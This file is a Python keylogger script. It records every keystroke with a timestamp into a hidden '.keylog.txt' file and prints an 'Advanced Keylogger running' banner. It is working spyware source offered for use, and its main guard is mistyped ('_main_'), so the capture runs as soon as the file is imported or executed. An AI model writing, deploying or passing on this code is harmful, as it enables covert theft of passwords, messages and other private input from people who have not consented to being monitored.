# keylogger

from pynput.keyboard import Listener, Key
import datetime
import os

# Define log file path (hidden file)
LOG_FILE = os.path.join(os.getcwd(), ".keylog.txt")

# Function to format and log keystrokes
def log_keystroke(key):
    try:
        # Clean and format the key
        if key == Key.space:
            key_str = ' '
        elif key == Key.enter:
            key_str = '[ENTER]\n'
        elif key == Key.tab:
            key_str = '[TAB]'
        elif key == Key.backspace:
            key_str = '[BACKSPACE]'
        elif hasattr(key, 'char') and key.char is not None:
            key_str = key.char
        else:
            key_str = f'[{key.name.upper()}]'
        
        # Add timestamp
        timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        log_entry = f'{timestamp} - {key_str}\n'

        # Write to log file
        with open(LOG_FILE, 'a', encoding='utf-8') as log_file:
            log_file.write(log_entry)
            log_file.flush()
    except Exception as e:
        # Optional: log error to file
        with open(LOG_FILE, 'a') as log_file:
            log_file.write(f"[ERROR] {datetime.datetime.now()}: {e}\n")

# Start the listener
def start_logging():
    with Listener(on_press=log_keystroke) as listener:
        listener.join()

if __name__== "_main_":
    print("[+] Advanced Keylogger running. Press CTRL + C to stop.")
start_logging()
